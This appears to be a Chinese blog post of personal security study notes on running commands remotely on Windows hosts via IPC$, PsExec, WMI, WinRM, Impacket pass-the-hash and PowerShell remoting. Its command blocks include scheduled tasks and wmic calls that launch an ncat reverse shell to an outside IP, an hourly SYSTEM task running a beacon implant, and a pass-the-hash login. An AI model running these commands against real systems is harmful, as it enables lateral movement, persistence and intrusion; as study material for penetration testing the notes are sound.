@@ -1,0 +1,460 @@
+<!doctype html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>3.24学习记录 - さぁ、君、取りたまえ</title><link rel="apple-touch-icon" href="/images/favicons/apple-touch-icon.png" sizes="180x180">
+<link rel="icon" href="/images/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
+<link rel="icon" href="/images/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
+<link rel="manifest" href="/images/favicons/manifest.json">
+<link rel="icon" href="/images/favicons/favicon.ico">
+<meta name="keywords" content="" />
+<meta name="description" content="" /><meta itemprop="name" content="3.24学习记录">
+<meta itemprop="description" content=""><meta itemprop="datePublished" content="2024-03-24T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2024-03-24T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="2947">
+<meta itemprop="keywords" content="," /><meta property="og:title" content="3.24学习记录" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/tech/sec-read-20240324/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-03-24T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2024-03-24T00:00:00&#43;00:00" /><meta property="og:site_name" content="さぁ、君、取りたまえ" />
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="3.24学习记录"/>
+<meta name="twitter:description" content=""/>
+<meta data-name="palette" content="blue"><link rel=stylesheet href="/css/bundle.min.9819e4e2411e150748363de90ec254ddcda514cc29bb1238a532433adb77735b.css" integrity="sha256-mBnk4kEeFQdINj3pDsJU3c2lFMwpuxI4pTJDOtt3c1s=" crossorigin="anonymous"><script src="/js/bundle.min.1c471eeba442e80350b91324d765b69b27af83f0de35d552aa2a410bac6ee793.js" integrity="sha256-HEce66RC6ANQuRMk12W2myevg/DeNdVSqipBC6xu55M=" crossorigin="anonymous"></script>
+<link href="https://cdn.bootcdn.net/ajax/libs/KaTeX/0.12.0/katex.min.css" rel="stylesheet">
+<script src="https://cdn.bootcdn.net/ajax/libs/KaTeX/0.12.0/katex.min.js"></script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/KaTeX/0.12.0/contrib/auto-render.min.js"> </script>
+<script type="text/javascript">
+	document.addEventListener("DOMContentLoaded", function() {
+  renderMathInElement(document.body, {
+    delimiters: [
+      {left: "$$", right: "$$", display: true},
+      {left: "$", right: "$", display: false}
+    ],
+    macros: {
+      "\\ge": "\\geqslant",
+      "\\le": "\\leqslant",
+      "\\geq": "\\geqslant",
+      "\\leq": "\\leqslant"
+	}
+  });
+}); 
+</script>
+<meta property="og:type" content="index"/>
+<meta property="og:title" content="Unzybaryl`s Sekai" />
+<meta property="og:image" content="https://eustia.me/images/profile1.jpg" />
+<meta property="og:url" content="https://eustia.me/" />
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC&display=swap" rel="stylesheet">
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdn.jsdelivr.net/gh/flatblowfish/cave-draw/dist/cave-draw.min.js"></script></head><body><header><nav class="navbar navbar-expand-xl fixed-top">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      
+      ティアなのです！
+      
+    </a>
+    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav me-1 mb-2 mb-lg-0"><form class="search-bar d-flex ms-1" action="/search">
+  <div class="input-group input-group-sm">
+    <button class="btn btn-search disabled position-absolute left-0" type="submit"><i class="fas fa-fw fa-search"></i></button>
+    <input class="form-control rounded-pill" id="searchQuery" name="q" type="search" aria-label="Search">
+  </div>
+</form></ul><ul class="navbar-nav me-1 mb-2 mb-lg-0 me-1 ms-auto"><li class="nav-item">
+          <a class="nav-link" href="/archives">
+            <i class="fas fa-fw fa-file-archive"></i>归档
+          </a>
+        </li><li class="nav-item">
+          <a class="nav-link" href="/about/">
+            <i class="fas fa-fw fa-info-circle"></i>关于
+          </a>
+        </li><li class="nav-item">
+          <a class="nav-link" href="/bin/">
+            <i class="fas fa-fw fa-bookmark"></i>废案
+          </a>
+        </li><li class="nav-item">
+  <a class="nav-link" data-bs-toggle="offcanvas" href="#offcanvasSettings" role="button"
+    aria-controls="offcanvasSettings">
+    <i class="fas fa-fw fa-sliders-h"></i> 设置
+  </a>
+</li>
+
+<div class="offcanvas offcanvas-end surface h-100" tabindex="-1" id="offcanvasSettings"
+  aria-labelledby="offcanvasSettingsLabel">
+  <div class="offcanvas-header">
+    <h5 class="offcanvas-title" w id="offcanvasSettingsLabel"><i class="fas fa-fw fa-sliders-h"></i> 设置</h5>
+    <a role="button" data-bs-dismiss="offcanvas" aria-label="Close">
+      <span class="fas fa-2x fa-fw fa-times"></span>
+    </a>
+  </div>
+  <div class="offcanvas-body"><section class="setting">
+  <form class="row">
+    <div class="col-auto">
+      <label><i class="fas fa-fw fa-adjust"></i> 模式</label>
+    </div>
+    <div class="col-auto ms-auto">
+      <div class="form-check form-switch">
+        <input class="form-check-input" type="checkbox" id="modeSwitcher">
+      </div>
+    </div>
+  </form>
+</section>
+<section class="setting">
+  <form class="font-size-switcher-form row">
+    <div class="col-auto">
+      <label for="fontSize" class="form-label"><i class="fas fa-fw fa-font"></i> 字体大小</label>
+    </div>
+    <div class="col-auto ms-auto">
+      <input type="range" class="form-range" min="-2" max="2" id="fontSize">
+    </div>
+  </form>
+</section>
+
+</div>
+</div></ul>
+    </div>
+  </div>
+</nav>
+</header>
+<main role="main" class="container">
+      <div class="row content">
+<div class="col-lg-8">
+  <div class="container"><nav class="row" aria-label="breadcrumb">
+  <ol class="breadcrumb surface"><li class="breadcrumb-item"><a href="/">主页</a></li><li class="breadcrumb-item"><a href="/posts/">文章</a></li><li class="breadcrumb-item"><a href="/posts/tech/">Tech</a></li><li class="breadcrumb-item active">3.24学习记录</li></ol>
+</nav><article class="post row surface"><div class="post-panel-wrapper">
+  <div class="post-panel d-flex flex-column">
+    <a id="sidebarToggler" class="action d-none d-lg-block" role="button">
+  <i class="fas fa-fw fa-expand-alt fa-rotate-45"></i>
+</a>
+  
+    
+
+    
+    <a class="action" data-bs-container="body" data-bs-toggle="popover" data-bs-html="true" data-bs-placement="bottom"
+  data-bs-trigger="focus" tabindex="0"
+  data-bs-content="&lt;a target=&#34;_blank&#34; rel=&#34;license&#34; href=&#34;https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh&#34;&gt;CC BY-NC-ND 4.0 &lt;i class=&#34;fab fa-fw fa-creative-commons&#34;&gt;&lt;/i&gt;&lt;i class=&#34;fab fa-fw fa-creative-commons-by&#34;&gt;&lt;/i&gt;&lt;i class=&#34;fab fa-fw fa-creative-commons-nc&#34;&gt;&lt;/i&gt;&lt;i class=&#34;fab fa-fw fa-creative-commons-nd&#34;&gt;&lt;/i&gt;&lt;/a&gt;
+">
+  <i class="fas fa-fw fa-copyright"></i>
+</a>
+    <a id="btnTOC" class="fas fa-fw fa-list-alt" data-bs-toggle="offcanvas" href="#offcanvasTOC" aria-controls="offcanvasTOC" role="button">
+</a>
+  </div>
+</div>
+<h1 class="post-title my-3">3.24学习记录
+</h1><div class="post-meta mb-3">
+  <span class="post-date me-2">
+    <i class="fas fa-fw fa-calendar-alt"></i>2024-03-24
+  </span>
+  <span class="post-reading-time me-2">
+    <i class="fas fa-fw fa-coffee"></i>6 分钟阅读
+  </span>
+<a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/" class="post-taxonomy">#计算机</a><a href="/series/%E5%AE%89%E5%85%A8/" class="post-taxonomy">#安全</a></div>
+
+
+
+                
+                <div class="addthis_inline_share_toolbox"></div>
+            <div class="offcanvas offcanvas-end surface" tabindex="-1" id="offcanvasTOC" aria-labelledby="offcanvasTOCLabel">
+  <div class="offcanvas-header">
+    <h5 class="offcanvas-title" id="offcanvasTOCLabel">目录</h5>
+    <a role="button" data-bs-dismiss="offcanvas" aria-label="Close">
+      <span class="fas fa-2x fa-fw fa-times"></span>
+    </a>
+  </div>
+  <div class="offcanvas-body">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-ipc">1. IPC</a>
+      <ul>
+        <li><a href="#1-ipc利用条件">1. IPC利用条件</a></li>
+      </ul>
+    </li>
+    <li><a href="#2psexec64exe">2.PsExec64.exe</a></li>
+    <li><a href="#3wmi">3.wmi</a></li>
+    <li><a href="#4wmicmd">4.WMIcmd</a></li>
+    <li><a href="#5winrm">5.winrm</a></li>
+    <li><a href="#6impacket-hash传递">6.Impacket hash传递</a></li>
+    <li><a href="#7windows-powershell远程执行">7.<strong>Windows Powershell远程执行</strong></a></li>
+  </ul>
+</nav>
+  </div>
+</div><div class="post-content mb-3" ><h1 id="一远程执行windows命令的几种姿势">一、远程执行windows命令的几种姿势</h1>
+<p><a href="https://mp.weixin.qq.com/s/mSzSsDr2pIqeMcyXOOaNrQ">https://mp.weixin.qq.com/s/mSzSsDr2pIqeMcyXOOaNrQ</a></p>
+<h2 id="1-ipc">1. IPC</h2>
+<p><strong>445端口 ｜无回显</strong></p>
+<p>总结IPC的文章：https://cloud.tencent.com/developer/article/2195508</p>
+<p>IPC（Inter-ProcessCommunication，进程间通信）。进程间通信是指两个进程的数据之间产生交互。</p>
+<p>关于进程间通信（InterProcess Communication），管道和共享内存为大家所熟知，包括匿名管道和命名管道。</p>
+<p>Windows系统的<code>IPC$</code>其实就命名管道的一种应用，考虑到它用于不同设备间通信，所以可以翻译为Internet Process Connection，是共享命名管道。 通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。</p>
+<h3 id="1-ipc利用条件">1. IPC利用条件</h3>
+<h4 id="21-开启了139445端口">2.1 开启了139、445端口</h4>
+<p>首先我们来了解一些基础知识：</p>
+<ul>
+<li>• SMB: (Server Message Block) Windows协议族，用于文件打印共享的服务；</li>
+<li>• NBT: (NETBios Over TCP/IP)使用137（UDP）138（UDP）139（TCP）端口实现基于TCP/IP协议的NETBIOS<a href="https://cloud.tencent.com/product/ccn?from_column=20065&amp;from=20065" target="_blank">网络互联</a>
+。</li>
+<li>• 在WindowsNT中SMB基于NBT实现，即使用139（TCP）端口；而在Windows2000中，SMB除了基于NBT实现，还可以直接通过445端口实现</li>
+</ul>
+<h4 id="22-目标主机开启了ipc共享">2.2 目标主机开启了IPC$共享</h4>
+<p>默认共享是为了方便管理员进行远程管理而默认开启的，包括所有的逻辑盘(C、D等)和系统目录 winnt 或 windows(admin)以及IPC。这些共享默认是开启的。可以使用net share命令查看这些共享是否开启。</p>
+<h4 id="23-ipc连接报错">2.3 IPC连接报错</h4>
+<p>如果目标主机没有开放<code>139</code>或<code>445</code>端口，我们去使用<code>IPC$</code>连接的话，会提示找不到网络名。</p>
+<p>基本命令：</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln"> 1</span>net use                               #查看本机建立的连接(本机连接其他机器)
+<span class="ln"> 2</span>net session                           #查看本机建立的连接(其他机器连接的本机)，需要administrator用户执行
+<span class="ln"> 3</span>net share                             #查看本地开启的共享
+<span class="ln"> 4</span>net share `IPC$`                        #开启`IPC$`共享
+<span class="ln"> 5</span>net share `IPC$` /del                   #删除`IPC$`共享
+<span class="ln"> 6</span>net share admin$ /del                 #删除admin$共享
+<span class="ln"> 7</span>net share c$ /del                     #删除C盘共享
+<span class="ln"> 8</span>net share d$ /del                     #删除D盘共享
+<span class="ln"> 9</span>net use * /del                        #删除所有连接
+<span class="ln">10</span>
+<span class="ln">11</span>net use \\192.168.135.15                   #与192.168.135.15建立ipc空连接
+<span class="ln">12</span>net use \\192.168.135.15\`IPC$`              #与192.168.135.15建立ipc空连接
+<span class="ln">13</span>net use \\192.168.135.15\`IPC$` /u:&#34;&#34; &#34;&#34;     #与192.168.135.15建立ipc空连接
+<span class="ln">14</span>
+<span class="ln">15</span>net view \\192.168.135.15                  #查看远程主机开启的默认共享
+<span class="ln">16</span>
+<span class="ln">17</span>net use \\192.168.135.15 /u:&#34;administrator&#34; &#34;root&#34;   #以administrator身份与192.168.135.15建立ipc连接
+<span class="ln">18</span>net use \\192.168.135.15 /del              #删除建立的ipc连接
+<span class="ln">19</span>
+<span class="ln">20</span>net time \\192.168.135.15                  #查看该主机上的时间
+<span class="ln">21</span>
+<span class="ln">22</span>net use \\192.168.135.15\c$  /u:&#34;administrator&#34; &#34;root&#34;  #建立C盘共享
+<span class="ln">23</span>dir \\192.168.135.15\c$                  #查看192.168.135.15C盘文件
+<span class="ln">24</span>dir \\192.168.135.15\c$\user             #查看192.168.135.15C盘文件下的user目录
+<span class="ln">25</span>dir \\192.168.135.15\c$\user\test.exe    #查看192.168.135.15C盘文件下的user目录下的test.exe文件
+<span class="ln">26</span>net use \\192.168.135.15\c$  /del        #删除该C盘共享连接
+<span class="ln">27</span>
+<span class="ln">28</span>net use k: \\192.168.135.15\c$  /u:&#34;administrator&#34; &#34;root&#34;  #将目标C盘映射到本地K盘
+<span class="ln">29</span>net use k: /del                                           #删除该映射
+<span class="ln">30</span>
+<span class="ln">31</span>tasklist /S 192.168.135.15 /U administrator -P Admin@admin #查看进程
+<span class="ln">32</span>copy fscan.exe \\192.168.135.15\c$ #将指定文件拷贝到目标系统中
+<span class="ln">33</span>
+<span class="ln">34</span>net time \\192.168.135.15 #查看
+<span class="ln">35</span>schtasks /create /s 192.168.135.15 /u administrator /p Admin@admin /tn test_crow /tr c:/beacon.exe  /sc once /st 14:32
+<span class="ln">36</span>#/s 目标 /u 用户名 /p 密码  /tn 计划任务名  /tr 指定文件路径   /sc 执行次数 或频率   /st 开始时间
+<span class="ln">37</span>schtasks /query  /s 192.168.135.15 /u administrator /p Admin@admin  /tn test_crow  # 查看任务计划
+<span class="ln">38</span>schtasks /delete /s 192.168.135.15 /u administrator /p Admin@admin /tn test_crow #删除任务计划
+<span class="ln">39</span>
+<span class="ln">40</span>在目标主机上创建一个名为test_crow的计划任务，启动程序为c:/beacon.exe ，启动权限为system，启动时间为每隔一小时启动一次
+<span class="ln">41</span>schtasks /create /s 192.168.135.15 /u administrator /p Admin@admin /tn test_crow /sc HOURLY /mo 1 /tr c:/beacon.exe /ru system /f
+<span class="ln">42</span>  
+<span class="ln">43</span>其他启动时间参数：
+<span class="ln">44</span>/sc onlogon  用户登录时启动
+<span class="ln">45</span>/sc onstart  系统启动时启动
+<span class="ln">46</span>/sc onidle   系统空闲时启动
+<span class="ln">47</span>
+<span class="ln">48</span>schtasks /run /s 192.168.135.15 /u administrator /p Admin@admin /i /tn test_crow #启动计划任务
+<span class="ln">49</span>schtasks /delete /s 192.168.135.15 /u administrator /p Admin@admin /tn test_crow  #激活之后，执行木马上线。删除任务计划
+<span class="ln">50</span>
+<span class="ln">51</span>schtasks /create /S \\192.168.220.172 /SC MINUTE /TN &#34;每分钟执行shell.bat&#34; /TR &#34;ncat.exe 8.8.8.8 9999 -e cmd.exe&#34; /RU zhangsan
+</code></pre></div><h2 id="2psexec64exe">2.PsExec64.exe</h2>
+<p><strong>445端口 ｜有回显</strong></p>
+<p>PsTools 是一套由 Sysinternals（现在是微软的一部分）开发的免费命令行工具集，用于在 Windows 系统上进行管理和诊断。这些工具提供了许多功能，可以帮助系统管理员执行各种任务，如远程执行命令、查询系统信息、管理进程、查看事件日志等。工具集中包含非常多的小工具，PsExec64就是其中之一。</p>
+<p>前提条件：</p>
+<ul>
+<li>目标机器445端口可达</li>
+<li>目标机器Server服务启用</li>
+<li>目标机器IPC$等共享必须启用</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>psexec.exe \\目标ip -u 用户名 -p 密码 cmd命令
+<span class="ln">2</span>// 执行单个命令：ipconfig
+<span class="ln">3</span>PsExec64.exe /accepteula \\192.168.220.172 -u NVYAO\itadmin -p Aa123123 whoami
+<span class="ln">4</span>
+<span class="ln">5</span>// 将cmd shell反弹回来
+<span class="ln">6</span>PsExec64.exe /accepteula \\192.168.220.172 -u NVYAO\itadmin -p Aa123123 cmd
+</code></pre></div><p>回去看一下被攻击机器，会被安装一个服务：PSEXESVC。如果被控机上停止这个服务，反弹shell也就终止了</p>
+<p>如果控制端主动结束shell，被控端会卸载这个服务及对应的可执行文件，所以如果是通过上面第一种执行单条命令，这个服务会创建完命令执行后很快又卸载掉。</p>
+<h2 id="3wmi">3.wmi</h2>
+<p>前提条件：</p>
+<ul>
+<li>目标机器135端口可达</li>
+<li>目标机器RPC（Remote Procedure Call）服务启用</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>wmic /node:192.168.220.172 /user:itadmin /password:Aa123123  process call create &#34;cmd.exe /c ipconfig&#34; #这样是没有回显的，看不到执行命令的结果
+<span class="ln">2</span>
+<span class="ln">3</span>wmic /node:192.168.220.172 /user:itadmin /password:Aa123123  process call create &#34;cmd.exe /c ipconfig&gt;c:\result.txt&#34; #通过写入文件的形式达到回显的目的
+<span class="ln">4</span>
+<span class="ln">5</span>wmic /node:192.168.220.172 /user:itadmin /password:Aa123123  process call create &#34;ncat.exe 8.8.8.8 9999 -e cmd.exe&#34; #直接执行反弹shell
+</code></pre></div><h2 id="4wmicmd">4.WMIcmd</h2>
+<p>wmic和WMIcmd 都是用于管理 Windows Management Instrumentation (WMI) 的工具，差异是：</p>
+<ul>
+<li>wmic是Windows操作系统自带的工具，而 WMIcmd 是一个第三方工</li>
+<li>wmic是windows系统自带会更加隐蔽</li>
+<li>wmic执行命令无回显，WMIcmd功能更强大，例如有回显</li>
+</ul>
+<p>前提条件：</p>
+<ul>
+<li>目标机器445端口可达</li>
+<li>目标机器Server服务启用</li>
+<li>目标机器IPC$等共享必须启用</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>WMIcmd.exe -h 192.168.220.172 -d nvyao.com -u itadmin -p Aa123123 -c &#34;ipconfig&#34;
+</code></pre></div><h2 id="5winrm">5.winrm</h2>
+<p>winrs和winrm都内置有。</p>
+<p>前提条件：</p>
+<ul>
+<li>目标机器5985端口可达，5986为https协议，需解决证书</li>
+<li>目标机器WinRM服务启用</li>
+</ul>
+<p>启用winrm服务及配置：</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>//肉机上面快速启动winrm服务，并绑定到5985端口：
+<span class="ln">2</span>winrm enumerate winrm/config/listener
+<span class="ln">3</span>winrm quickconfig -q
+<span class="ln">4</span>winrm set winrm/config/Client @{TrustedHosts=&#34;*&#34;}
+<span class="ln">5</span>netstat -ano|find &#34;5985&#34;
+</code></pre></div><p>攻击命令：</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>//客户端连接方式：
+<span class="ln">2</span>winrs -r:http://192.168.220.171:5985 -u:administrator -p:Aa123123 &#34;whoami&#34;
+</code></pre></div><h2 id="6impacket-hash传递">6.Impacket hash传递</h2>
+<p>Impacket 是一个开源的 Python 库，提供了一组用于网络协议分析和渗透测试的工具。它是由 SecureAuth Corporation 开发的，用于简化和自动化与 Windows 网络通信相关的任务。</p>
+<p>Impacket 提供了许多功能和工具，用于与 Windows 网络进行交互和执行各种操作。</p>
+<p>前提条件：</p>
+<ul>
+<li>目标机器SMB 445端口可达</li>
+<li>准备python3和Impacket工具套件</li>
+</ul>
+<p>攻击命令：</p>
+<p>1）先得获取登录账户的hash，可以通过mimikatz或者其他工具</p>
+<p>2）hash传递登录执行命令（-hashes 后面有个空格）</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>python wmiexec.py -hashes :7c78aa82a819041fa603b1b181399e58 administrator@192.168.220.171 &#34;whoami&#34;
+</code></pre></div><h2 id="7windows-powershell远程执行">7.<strong>Windows Powershell远程执行</strong></h2>
+<p>可以使用单个 PowerShell 命令在一台或数百台计算机上运行命令。Windows PowerShell 支持使用各种技术（包括 WMI、RPC 和 WS-Management）进行远程计算。</p>
+<p>前提条件：</p>
+<ul>
+<li>目标机器SMB 445端口可达</li>
+<li>有管理员权限</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>// 1.运行单条命令
+<span class="ln">2</span>Invoke-Command -ComputerName Server01, Server02 -ScriptBlock { ifconfig }
+<span class="ln">3</span>// 2.运行脚本程序
+<span class="ln">4</span>Invoke-Command -ComputerName Server01, Server02 -FilePath c:\Scripts\DiskCollect.ps1
+<span class="ln">5</span>// 3.启动交互式会话
+<span class="ln">6</span>Enter-PSSession Server01
+</code></pre></div><p>在上述命令中，没有显式提供帐号密码是因为<strong>该命令默认使用当前用户的凭据来进行身份验证</strong>。如果当前用户是在本地计算机上拥有管理员权限的帐户，并且与远程计算机具有相同的凭据（用户名和密码），则可以成功执行远程命令。</p>
+<p>SMB 主要用于文件共享和网络访问，WinRM 是一种远程管理协议，WMI 提供了系统管理和查询接口，而 RPC 是一种通信协议和框架，用于实现远程过程调用。这些服务可以相互配合使用，以实现不同的远程管理和操作需求。</p></div><hr /><div class="post-navs d-flex mb-3 justify-content-between">
+  <div class="post-nav w-50"><div class="prev-post btn btn-sm">
+      <a href="/posts/tech/sec-read-20240321/">3.21-23学习记录
+</a>
+    </div></div>
+  <div class="post-nav flex-row-reverse"><div class="next-post btn btn-sm">
+      <a href="/posts/tech/java-0-audition/">面试准备-Spring
+</a>
+    </div></div>
+</div><section class="related-posts">
+    <h3>相关文章</h3>
+    <ul class="related-posts"><li><a href="/posts/tech/sec-read-20240321/">3.21-23学习记录
+</a></li><li><a href="/posts/anime/bokugashinouto/">僕が死のうと思ったのは
+</a></li><li><a href="/posts/anime/shinainaru/"> 親愛なる世界へ
+</a></li><li><a href="/posts/anime/kimigahikarini/">君が光に変えて行く
+</a></li><li><a href="/posts/anime/fairytale/">Fairytale
+</a></li></ul>
+  </section></article>
+
+
+
+
+<div id="vcomments" class="post-comments surface row">
+</div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            appId: '18xpdRPZMKmyTjmjtMIK8zyB-gzGzoHsz',
+            appKey: 'haH3Ysz9ic7RFcoqbIvPDh8H',
+            avatar:'retro',
+            visitor:true,
+            placeholder:'有什么想说的吗？'
+
+        });
+
+        var count = 0;
+        var domTimer = setInterval(function () {
+            if (++count > 50) clearInterval(domTimer);
+            if (document.querySelector('#veditor')) {
+                clearInterval(domTimer);
+                var cdraw = new CaveDraw({
+                    element: "#veditor",
+                    readOnlyMode: false, 
+                    afterUpdateEditor: ()=>{ 
+                        document.querySelector('#veditor').focus();
+                        document.querySelector('#veditor').blur();
+                    },
+                    controls: ['brush', 'eraser', 'bucket', 'clear', 'undo', 'redo', 'save']
+                });
+            }
+        }, 200);
+    </script></div>
+</div><aside class="col-lg-4 sidebar d-flex">
+  <div class="container"><section class="profile surface row">
+  <div class="col-xl-6 d-flex align-items-center justify-content-center">
+    <img class="profile-avatar img-fluid" src="/images/profile2.jpg" alt="理想奈" loading="lazy">
+  </div>
+  <div class="col-xl-6">
+    <h5 class="profile-name my-2">理想奈</h5><div class="profile-bio mb-2">我爱马克思! 我爱辩证法!</div>
+    
+  </div>
+</section><section class="recent-posts row surface">
+  <h4>最近文章</h4>
+  <ul><li><a href="/posts/tech/java-0-audition-3/">软件维护管理面试
+</a></li><li><a href="/posts/tech/java-0-audition-2/">京东笔试准备&amp;牛客网刷题
+</a></li><li><a href="/posts/tech/java-6-autoconfiguration/">项目: Swagger的自动装配
+</a></li><li><a href="/posts/tech/java-5-algorithm/">算法刷题
+</a></li><li><a href="/posts/tech/java-4-basic/">Java基础查漏补缺
+</a></li><li><a href="/posts/tech/java-2-mysql/">MySQL学习笔记
+</a></li><li><a href="/posts/tech/java-3-spring-cloud/">SpringCloud学习笔记
+</a></li></ul>
+</section><section class="taxonomy-categories row surface">
+      <h4>
+        <a href="/categories">分类</a>
+      </h4>
+      <div><a href="/categories/%E4%BA%8C%E6%AC%A1%E5%85%83/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="二次元">
+          二次元 <span class="badge rounded-pill">24</span>
+        </a><a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="计算机">
+          计算机 <span class="badge rounded-pill">15</span>
+        </a><a href="/categories/%E6%96%87%E5%AD%97%E7%B1%BB/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="文字类">
+          文字类 <span class="badge rounded-pill">6</span>
+        </a><a href="/categories/%E6%99%AE%E9%80%9A%E7%B1%BB/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="普通类">
+          普通类 <span class="badge rounded-pill">5</span>
+        </a></div>
+    </section><section class="taxonomy-series row surface">
+      <h4>
+        <a href="/series">专栏</a>
+      </h4>
+      <div><a href="/series/%E5%8A%A8%E6%BC%AB%E6%AD%8C%E6%9B%B2/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="动漫歌曲">
+          动漫歌曲 <span class="badge rounded-pill">21</span>
+        </a><a href="/series/galgame/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="Galgame">
+          Galgame <span class="badge rounded-pill">9</span>
+        </a><a href="/series/java/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="Java">
+          Java <span class="badge rounded-pill">9</span>
+        </a><a href="/series/%E5%AE%89%E5%85%A8/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="安全">
+          安全 <span class="badge rounded-pill">2</span>
+        </a></div>
+    </section></div>
+</aside>
+</div>
+    </main><footer class="footer mt-auto py-3 text-center container"><nav class="social-links nav my-2 justify-content-center"></nav>
+<div class="copyright mb-2">
+  Copyright © 2021-2024 Unaybaryl. All Rights Reserved.
+</div>
+</footer>
+<a id="btnScrollToTop" class="btn-scroll-to-top">
+  <i class="fas fa-fw fa-chevron-circle-up fa-2x"></i>
+</a>
+
+
+
+              
+            </body>
+</html>
